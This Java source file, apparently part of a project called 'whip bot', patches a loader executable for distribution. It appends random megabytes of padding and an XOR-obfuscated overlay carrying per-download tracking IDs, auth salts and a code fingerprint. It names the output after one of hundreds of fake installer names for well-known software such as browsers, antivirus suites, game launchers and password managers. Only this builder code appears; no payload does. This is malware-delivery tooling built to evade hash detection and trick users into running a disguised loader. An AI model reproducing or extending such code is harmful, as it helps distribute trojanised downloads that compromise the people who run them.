package fr.whip.bot.util;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.security.SecureRandom;

public class LoaderPatcher {

    private static final byte[] MAGIC = {'W', 'H', 'I', 'P'};
    // Overlay v5: + obfCodeFingerprint[32] + codeFingerprintKey[32] for Phase 3.
    private static final short VERSION = 5;
    private static final SecureRandom RANDOM = new SecureRandom();

    private static final int MIN_PADDING = 1 * 1024 * 1024;
    private static final int MAX_PADDING = 10 * 1024 * 1024;

    private static final int DOWNLOAD_ID_BYTES = 16;
    private static final int DOWNLOAD_ID_SALT_BYTES = 16;
    private static final int AUTH_SALT_BYTES = 16;
    private static final int AUTH_SALT_KEY_BYTES = 16;
    private static final int ALGO_SEED_BYTES = 32;
    private static final int ALGO_SEED_KEY_BYTES = 32;
    private static final int CODE_FINGERPRINT_BYTES = 32;
    private static final int CODE_FINGERPRINT_KEY_BYTES = 32;

    public record PatchResult(byte[] patchedBytes, byte[] authSalt, byte[] algoSeed, byte[] codeFingerprint) {}

    private static final String[] FILE_NAMES = {
            "ChromeSetup.exe", "GoogleChromeSetup.exe", "ChromeInstaller.exe", "FirefoxSetup.exe",
            "FirefoxInstaller.exe", "OperaSetup.exe", "OperaGXSetup.exe", "EdgeSetup.exe",
            "BraveBrowserSetup.exe", "VivaldiSetup.exe", "TorBrowserSetup.exe", "YandexBrowserSetup.exe",
            "DiscordSetup.exe", "DiscordInstaller.exe", "TeamsSetup.exe", "SlackSetup.exe",
            "ZoomInstaller.exe", "ZoomSetup.exe", "SkypeSetup.exe", "TelegramSetup.exe",
            "WhatsAppSetup.exe", "SignalSetup.exe", "SteamSetup.exe", "EpicGamesLauncherInstaller.exe",
            "Battle.net-Setup.exe", "OriginSetup.exe", "EAappInstaller.exe", "UbisoftConnectInstaller.exe",
            "GOGGalaxySetup.exe", "RiotClientSetup.exe", "MinecraftInstaller.exe", "Rockstar-Games-Launcher.exe",
            "7zSetup.exe", "7zipSetup.exe", "WinRAR-x64.exe", "WinRARSetup.exe",
            "WinZipSetup.exe", "CCleanerSetup.exe", "CCleanerInstaller.exe", "RevoUninstallerSetup.exe",
            "EverythingSetup.exe", "CPU-Z_Setup.exe", "GPU-Z_Setup.exe", "SpeccySetup.exe",
            "HWMonitorSetup.exe", "VLCSetup.exe", "KMPlayerSetup.exe", "PotPlayerSetup.exe",
            "SpotifySetup.exe", "iTunesSetup.exe", "AudacitySetup.exe", "OBS-Studio-Setup.exe",
            "HandBrakeSetup.exe", "DaVinciResolveInstaller.exe", "MediaPlayerClassicSetup.exe", "KodiSetup.exe",
            "PlexMediaServerSetup.exe", "VSCodeSetup.exe", "VisualStudioInstaller.exe", "GitSetup.exe",
            "GitHubDesktopSetup.exe", "NodeJSSetup.exe", "PythonSetup.exe", "JavaSetup.exe",
            "DockerDesktopInstaller.exe", "PostmanSetup.exe", "Notepad++Installer.exe", "SublimeTextSetup.exe",
            "AtomSetup.exe", "AvastSetup.exe", "AVGSetup.exe", "KasperskySetup.exe",
            "BitdefenderSetup.exe", "ESETInstaller.exe", "NortonSetup.exe", "McAfeeSetup.exe",
            "MalwarebytesSetup.exe", "SuperAntiSpywareSetup.exe", "uTorrent.exe", "qbittorrent_setup.exe",
            "BitTorrentSetup.exe", "FileZilla_3.exe", "InternetDownloadManager.exe", "FreeDownloadManager.exe",
            "JDownloaderSetup.exe", "MiponySetup.exe", "AdobeReaderSetup.exe", "AcroRdrDCSetup.exe",
            "AdobeAcrobatInstaller.exe", "LibreOfficeSetup.exe", "OpenOfficeSetup.exe", "FoxitReaderSetup.exe",
            "PDFCreatorSetup.exe", "NitroPDFSetup.exe", "WPSOfficeSetup.exe", "SumatraPDFSetup.exe",
            "GeForceExperienceSetup.exe", "NVIDIA-Driver-Installer.exe", "AMD-Adrenalin-Setup.exe", "RealtekAudioSetup.exe",
            "IntelDriverSupportSetup.exe", "ChipsetDriverSetup.exe", "DirectXSetup.exe", "DotNetFxSetup.exe",
            "VC_redist.x64.exe", "VC_redist.x86.exe", "BlenderSetup.exe", "GIMPSetup.exe",
            "InkscapeSetup.exe", "PaintNetSetup.exe", "KritaSetup.exe", "UnityHubSetup.exe",
            "UnrealEngineInstaller.exe", "GodotSetup.exe", "EclipseInstaller.exe", "IntelliJIDEASetup.exe",
            "PyCharmSetup.exe", "WebStormSetup.exe", "CLionSetup.exe", "AndroidStudioSetup.exe",
            "XAMPPSetup.exe", "WampServerSetup.exe", "LaragonSetup.exe", "FileZilla_Server_Setup.exe",
            "TeamViewerSetup.exe", "AnyDeskSetup.exe", "ParsecSetup.exe", "LogMeInSetup.exe",
            "OpenVPNSetup.exe", "NordVPNSetup.exe", "ExpressVPNSetup.exe", "ProtonVPNSetup.exe",
            "WindscribeSetup.exe", "CyberGhostVPNSetup.exe", "TunnelBearSetup.exe", "HotspotShieldSetup.exe",
            "HamachiSetup.exe", "RadminVPNSetup.exe", "WiresharkSetup.exe", "NmapSetup.exe",
            "AngryIPScannerSetup.exe", "GlassWireSetup.exe", "FiddlerSetup.exe", "CharlesProxySetup.exe",
            "PostgreSQLSetup.exe", "MySQLInstaller.exe", "MongoDBSetup.exe", "SQLiteStudioSetup.exe",
            "DBeaverSetup.exe", "HeidiSQLSetup.exe", "pgAdminSetup.exe", "OracleClientSetup.exe",
            "VirtualBoxSetup.exe", "VMwareWorkstationSetup.exe", "VMwarePlayerSetup.exe", "HyperVInstaller.exe",
            "BlueStacksInstaller.exe", "LDPlayerSetup.exe", "NoxPlayerSetup.exe", "MEmuSetup.exe",
            "GenymotionSetup.exe", "PowerISOSetup.exe", "UltraISOSetup.exe", "RufusSetup.exe",
            "BalenaEtcherSetup.exe", "Win32DiskImagerSetup.exe", "AOMEIBackupperSetup.exe", "EaseUSPartitionMasterSetup.exe",
            "MiniToolPartitionWizardSetup.exe", "MacriumReflectSetup.exe", "ClonezillaSetup.exe", "AcronisTrueImageSetup.exe",
            "EaseUSDataRecoverySetup.exe", "RecuvaSetup.exe", "DiskDrillSetup.exe", "StellarDataRecoverySetup.exe",
            "KeePassSetup.exe", "LastPassInstaller.exe", "BitwardenSetup.exe", "DashlaneSetup.exe",
            "1PasswordSetup.exe", "AuthySetup.exe", "GoogleDriveSetup.exe", "DropboxInstaller.exe",
            "OneDriveSetup.exe", "MEGAsyncSetup.exe", "pCloudSetup.exe", "NextcloudSetup.exe",
            "ResilioSyncSetup.exe", "SyncthingSetup.exe", "ShareXSetup.exe", "GreenshotSetup.exe",
            "LightshotSetup.exe", "SnagitSetup.exe", "PicPickSetup.exe", "FastStoneCaptureSetup.exe",
            "IrfanViewSetup.exe", "XnViewSetup.exe", "ACDSeeSetup.exe", "PhotoScapeSetup.exe",
            "CanvaSetup.exe", "ZoomRoomsSetup.exe", "WebexSetup.exe", "GoToMeetingSetup.exe",
            "BlueJeansSetup.exe", "RingCentralSetup.exe", "DiscordPTBSetup.exe", "DiscordCanarySetup.exe",
            "SteamCMDSetup.exe", "EpicOnlineServicesInstaller.exe", "GOGSetup.exe", "RiotVanguardSetup.exe",
            "ValorantInstaller.exe", "LeagueOfLegendsInstaller.exe", "FortniteInstaller.exe", "ApexLegendsInstaller.exe",
            "OverwatchInstaller.exe", "CSGOInstaller.exe", "Dota2Installer.exe", "PUBGInstaller.exe",
            "CallOfDutyInstaller.exe", "WarzoneInstaller.exe", "BattlefieldInstaller.exe", "FIFAInstaller.exe",
            "NBA2KInstaller.exe", "NeedForSpeedInstaller.exe", "ForzaHorizonInstaller.exe", "MicrosoftFlightSimulatorInstaller.exe",
            "RobloxPlayerInstaller.exe", "RobloxStudioInstaller.exe", "UnityEditorInstaller.exe", "UnrealEditorInstaller.exe",
            "CryEngineSetup.exe", "SourceSDKSetup.exe", "DirectXWebSetup.exe", "VCRedistSetup.exe",
            "DotNetRuntimeSetup.exe", "DotNetDesktopRuntimeSetup.exe", "WindowsSDKSetup.exe", "WindowsTerminalInstaller.exe",
            "PowerToysSetup.exe", "SysinternalsSuiteSetup.exe", "ProcessExplorerSetup.exe", "ProcessMonitorSetup.exe",
            "AutorunsSetup.exe", "TCPViewSetup.exe", "BGInfoSetup.exe", "PsToolsSetup.exe",
            "DiskUsageSetup.exe", "WinSCPSetup.exe", "PuTTYSetup.exe", "MobaXtermSetup.exe",
            "SecureCRTSetup.exe", "TeraTermSetup.exe", "FileZillaClientSetup.exe", "CoreFTPSetup.exe",
            "SmartFTPSetup.exe", "CuteFTPSetup.exe", "CyberduckSetup.exe", "TransmitSetup.exe",
            "TotalCommanderSetup.exe", "DirectoryOpusSetup.exe", "XYplorerSetup.exe", "FreeCommanderSetup.exe",
            "ExplorerPlusPlusSetup.exe", "QDirSetup.exe", "MultiCommanderSetup.exe", "DoubleCommanderSetup.exe",
            "WinMergeSetup.exe", "BeyondCompareSetup.exe", "AraxisMergeSetup.exe", "ExamDiffSetup.exe",
            "KDiff3Setup.exe", "MeldSetup.exe", "Notepad2Setup.exe", "Notepad3Setup.exe",
            "UltraEditSetup.exe", "EditPadSetup.exe", "PSPadSetup.exe", "RJTextEdSetup.exe",
            "BracketsSetup.exe", "BluefishSetup.exe", "GeanySetup.exe", "KateSetup.exe",
            "CudaToolkitSetup.exe", "OpenCLSDKSetup.exe", "DirectMLSetup.exe", "TensorFlowSetup.exe",
            "PyTorchSetup.exe", "AnacondaSetup.exe", "MinicondaSetup.exe", "JupyterNotebookSetup.exe",
            "RStudioSetup.exe", "MATLABInstaller.exe", "OctaveSetup.exe", "ScilabSetup.exe",
            "OriginLabSetup.exe", "GraphPadPrismSetup.exe", "SPSSSetup.exe", "StataSetup.exe",
            "NVivoSetup.exe", "AtlasTISetup.exe", "EndNoteSetup.exe", "ZoteroSetup.exe",
            "MendeleySetup.exe", "CitaviSetup.exe", "JabRefSetup.exe", "CalibreSetup.exe",
            "SigilSetup.exe", "KindleSetup.exe", "AdobeDigitalEditionsSetup.exe", "FBReaderSetup.exe",
            "SumatraPDFInstaller.exe", "FoxitPhantomPDFSetup.exe", "PDFXChangeEditorSetup.exe", "Able2ExtractSetup.exe",
            "SodaPDFSetup.exe", "IcecreamPDFEditorSetup.exe", "PDFsamSetup.exe", "PDFShaperSetup.exe",
            "PDF24CreatorSetup.exe", "doPDFSetup.exe", "CutePDFWriterSetup.exe", "BullzipPDFPrinterSetup.exe",
            "PrimoPDFSetup.exe", "Win2PDFSetup.exe", "FinePrintSetup.exe", "pdfFactorySetup.exe"
    };

    public static PatchResult patchLoader(File originalLoader, String downloadId) throws IOException {
        byte[] originalBytes = Files.readAllBytes(originalLoader.toPath());

        // Compute fingerprint from the original PE before appending anything.
        byte[] codeFingerprint = PeFingerprint.hashTextSection(originalBytes);

        ByteArrayOutputStream output = new ByteArrayOutputStream(originalBytes.length + MAX_PADDING);
        output.write(originalBytes);

        int paddingSize = RANDOM.nextInt(MIN_PADDING, MAX_PADDING + 1);
        byte[] randomPadding = new byte[paddingSize];
        RANDOM.nextBytes(randomPadding);
        output.write(randomPadding);

        byte[] authSalt = new byte[AUTH_SALT_BYTES];
        RANDOM.nextBytes(authSalt);

        byte[] algoSeed = new byte[ALGO_SEED_BYTES];
        RANDOM.nextBytes(algoSeed);

        byte[] overlay = createObfuscatedOverlay(downloadId, authSalt, algoSeed, codeFingerprint);
        output.write(overlay);

        return new PatchResult(output.toByteArray(), authSalt, algoSeed, codeFingerprint);
    }

    private static byte[] createObfuscatedOverlay(String downloadId, byte[] authSalt, byte[] algoSeed, byte[] codeFingerprint) {
        int overlaySize = MAGIC.length + Short.BYTES
                + DOWNLOAD_ID_BYTES + Long.BYTES + DOWNLOAD_ID_SALT_BYTES
                + AUTH_SALT_BYTES + AUTH_SALT_KEY_BYTES
                + ALGO_SEED_BYTES + ALGO_SEED_KEY_BYTES
                + CODE_FINGERPRINT_BYTES + CODE_FINGERPRINT_KEY_BYTES;

        ByteBuffer buffer = ByteBuffer.allocate(overlaySize);
        buffer.order(ByteOrder.LITTLE_ENDIAN);

        buffer.put(MAGIC);
        buffer.putShort(VERSION);

        byte[] downloadIdSalt = new byte[DOWNLOAD_ID_SALT_BYTES];
        RANDOM.nextBytes(downloadIdSalt);

        byte[] downloadIdBytes = hexStringToBytes(downloadId);
        byte[] obfuscatedDownloadId = new byte[DOWNLOAD_ID_BYTES];
        for (int i = 0; i < DOWNLOAD_ID_BYTES; i++) {
            obfuscatedDownloadId[i] = (byte) (downloadIdBytes[i] ^ downloadIdSalt[i]);
        }
        buffer.put(obfuscatedDownloadId);

        long timestamp = System.currentTimeMillis();
        buffer.putLong(timestamp);

        buffer.put(downloadIdSalt);

        byte[] authSaltKey = new byte[AUTH_SALT_KEY_BYTES];
        RANDOM.nextBytes(authSaltKey);

        byte[] obfuscatedAuthSalt = new byte[AUTH_SALT_BYTES];
        for (int i = 0; i < AUTH_SALT_BYTES; i++) {
            obfuscatedAuthSalt[i] = (byte) (authSalt[i] ^ authSaltKey[i]);
        }
        buffer.put(obfuscatedAuthSalt);
        buffer.put(authSaltKey);

        byte[] algoSeedKey = new byte[ALGO_SEED_KEY_BYTES];
        RANDOM.nextBytes(algoSeedKey);

        byte[] obfuscatedAlgoSeed = new byte[ALGO_SEED_BYTES];
        for (int i = 0; i < ALGO_SEED_BYTES; i++) {
            obfuscatedAlgoSeed[i] = (byte) (algoSeed[i] ^ algoSeedKey[i]);
        }
        buffer.put(obfuscatedAlgoSeed);
        buffer.put(algoSeedKey);

        byte[] codeFingerprintKey = new byte[CODE_FINGERPRINT_KEY_BYTES];
        RANDOM.nextBytes(codeFingerprintKey);

        byte[] obfuscatedCodeFingerprint = new byte[CODE_FINGERPRINT_BYTES];
        for (int i = 0; i < CODE_FINGERPRINT_BYTES; i++) {
            obfuscatedCodeFingerprint[i] = (byte) (codeFingerprint[i] ^ codeFingerprintKey[i]);
        }
        buffer.put(obfuscatedCodeFingerprint);
        buffer.put(codeFingerprintKey);

        int dataLength = buffer.position();
        byte[] result = new byte[dataLength];
        buffer.flip();
        buffer.get(result);
        return result;
    }

    private static byte[] hexStringToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    public static String generateFileName() {
        return FILE_NAMES[RANDOM.nextInt(FILE_NAMES.length)];
    }
}
